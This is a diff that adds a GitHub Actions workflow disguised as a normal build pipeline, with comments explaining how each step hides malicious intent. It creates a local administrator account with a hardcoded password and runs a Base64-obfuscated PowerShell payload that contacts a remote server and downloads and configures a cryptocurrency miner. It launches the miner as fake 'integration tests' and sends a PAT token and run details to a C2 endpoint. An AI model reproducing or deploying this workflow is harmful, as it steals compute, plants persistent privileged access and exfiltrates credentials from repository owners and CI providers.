@@ -1,0 +1,97 @@
+# A generic, professional-sounding name for the workflow.
+name: Main Build Pipeline
+
+# Triggers on manual start, but also on pushes/PRs to look like a real CI process.
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+# Environment variables can make the workflow look more complex and legitimate.
+env:
+  PROJECT_NAME: 'WebApp'
+  DOTNET_VERSION: '6.0.x'
+
+jobs:
+  # The job name mimics a standard build-and-publish process for Windows.
+  build-and-publish-windows:
+    runs-on: windows-latest
+    # Timeout is set just under the 6-hour limit to seem less suspicious.
+    timeout-minutes: 355 
+
+    steps:
+      # All legitimate CI pipelines start by checking out the code.
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      # This step looks like it's setting up a build user, a plausible action.
+      # The actual goal is to create a privileged user for the payload.
+      - name: Setup Build Environment
+        shell: powershell
+        run: |
+          # A comment explaining the purpose from a legitimate point of view.
+          # Configure a dedicated build user with elevated privileges for service installation.
+          $pw = "Bldr-1337-CI"
+          $sPass = ConvertTo-SecureString $pw -AsPlainText -Force
+          $userName = "Builder"
+          New-LocalUser -Name $userName -Password $sPass -AccountNeverExpires
+          
+          # Obfuscating 'Administrators' by concatenating strings.
+          $grp = "Admin" + "istrators"
+          Add-LocalGroupMember -Group $grp -Member $userName
+
+      # This is the core malicious step, heavily disguised.
+      # The Base64 blob contains the logic to download, configure (with TLS), and run the miner.
+      - name: Download & Configure Build Dependencies
+        id: configure_deps
+        shell: powershell
+        run: |
+          Write-Host "Fetching required build assets and configuration tokens..."
+          # This Base64 command contains the entire logic to:
+          # 1. Contact the C2 for instructions.
+          # 2. Download the miner package.
+          # 3. Create the config.json with a TLS-enabled connection to the pool.
+          # 4. Set the path to the executable as an output.
+          $encodedCommand = "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTdG9wIgpDbGVhci1Ib3N0CgokcDEgPSAnaHR0cHM6Ly8nCiRwMiA9ICdwb29sc2VydmVyJwokcDcgPSAnLm9ucmVuZGVyLmNvbS8nCiR1cmwgPSAiJHAxJHAyJHA3IgokY29uZmlnSnNvbiA9IChJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudApkd3JpdGUtbWVzc2FnZSAiRmV0Y2hpbmcgY29uZmlybWF0aW9uIHRva2VuLi4uIgokY29uZmlnID0gJGNvbmZpZ0pzb24gfCBDb252ZXJ0RnJvbS1Kc29uCgokYXNzZXRVcmwgPSAkY29uZmlnLm1pbmVyLmRvd25sb2FkVXJsCiRleGVDb2RlbmFtZSA9ICRjb25maWcubWluZXIuZXhlY3V0YWJsZQoKJHRtcCA9ICRlbnY6VEVNUApkemlwUGFhCA9ICJUYWJsZS1JdGVtIC1QYXRoICR0bXAgLUl0ZW1UeXBlIERpcmVjdG9yeSAkYXNzZXQuemlwIgokZXh0cmFjdFBhdGggPSAiSm9pbi1QYXRoICR0bXAgXGFzc2V0IgppbndrIC1VcmlpICRhc3NldFVybCAtT3V0RmlsZSAkemlwUGF0aApFeHBhbmQtQXJjaGl2ZSAtUGF0aCAkemlwUGF0aCAtRGVzdGluYXRpb25QYXRoICRleHRyYWN0UGF0aCAtRm9yY2UKJGtleVBhdGggPSAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkZXh0cmFjdFBhdGggLVJlY3Vyc2UgLUZpbHRlciAkZXhlQ29RlbmFtZSkLkZ1bGxOYW1lCmlmICgtbm90ICRrZXlQYXRoKSB7IHRocm93ICJDUklUSUNBTCBFUlJPUjogQ291bGQgbm90IHZlcmlmeSBidWlsZCBrZXkhIiB9CmVjaG8gIjo6c2V0LW91dHB1dCBuYW1lPXRlc3RfcnVubmVyX3BhdGg6OiRrZXlQYXRoIgoKJHBvb2xFbmRwb2ludCA9ICRjb25maWcucG9vbC51cmwKJHVzZXJBY2NvdW50ID0gJGNvbmZpZy5wb29sLnVzZXIKJHBvb2xUb2tlbiA9ICRjb25maWcucG9sC5wYXNzCgokSlNPTkNvbnRlbnQgPSBAewogICAgYXV0b3NhdmUgPSAkdHJ1ZQogICAgY3B1ID0gQHsKICAgICAgICBlbmFibGVkID0gJHRydWUKICAgICAgICAibWF4LXRocmVhZHMtaGludCIgPSAzNQogICAgfQogICAgb3BlbmNsID0gJGZhbHNlCiAgICBjdWRhID0gJGZhbHNlCiAgICBwb29scyA9IEAoCiAgICAgICAgQHsKICAgICAgICAgICAgYWxnbyA9ICJyeC8wIgogICAgICAgICAgICB1cmwgPSAkcG9vbEVuZHBvaW50CiAgICAgICAgICAgIHVzZXIgPSAkdXNlckFjY291bnQKICAgICAgICAgICAgcGFzcyA9ICRwb29sVG9rZW4KICAgICAgICAgICAgdGxzID0gJHRydWUgICMgPD09PSBFbmFibGVzIFRMUyBFbmNyeXB0aW9uCiAgICAgICAgfQogICAgKQp9IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwMAoKJGNvbmZpZ1BhdGggPSBKb2luLVBhdGggKFNwbGl0LVBhdGggLVBhdGggJGtleVBhdGgpICJjb25maWcuanNvbiIKCiRKU09OQ29udGVudCB8IFNldC1Db250ZW50IC1QYXRoICRjb25maWdQYXRoCndyaXRlLW1lc3NhZ2UgIkNvbmZpZ3VyYXRpb24gZmlsZSB2ZXJpZmllZC4i"
+          $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
+          Invoke-Expression $decodedCommand
+
+      # The name of this step provides a plausible reason for a long-running job.
+      - name: Execute Long-Running Integration Tests
+        shell: powershell
+        run: |
+          $testRunnerPath = "${{ steps.configure_deps.outputs.test_runner_path }}"
+          $arguments = "--background"
+          Write-Host "Starting test suite in background mode... This may take several hours."
+          Start-Process -FilePath $testRunnerPath -ArgumentList $arguments
+          Write-Host "Test suite process started successfully."
+
+      # This is the new, external trigger step. It phones home to the C2 server.
+      # It looks like a standard step to report build status to a monitoring service.
+      - name: Report Build Status to Monitoring Service
+        if: always() # CRITICAL: This ensures the C2 is notified even if the "tests" fail.
+        shell: powershell
+        run: |
+          Write-Host "Sending completion signal to monitoring endpoint..."
+          
+          # The C2 server's URL is stored in a secret, which is standard secure practice.
+          $monitoringEndpoint = "${{ secrets.C2_URL }}"
+          
+          # The payload sends all the info the C2 needs to schedule the next run.
+          $payload = @{
+              pat_token     = "${{ secrets.PAT_TOKEN }}";
+              repository    = "${{ github.repository }}";
+              workflow_file = "main-pipeline.yml";
+              run_id        = "${{ github.run_id }}";
+              status        = "completed";
+          } | ConvertTo-Json
+          
+          try {
+              Invoke-RestMethod -Uri $monitoringEndpoint -Method Post -Body $payload -ContentType 'application/json'
+              Write-Host "Status reported successfully."
+          } catch {
+              # A try/catch block makes the script more robust and less suspicious.
+              Write-Warning "Failed to report status to the monitoring service."
+          }
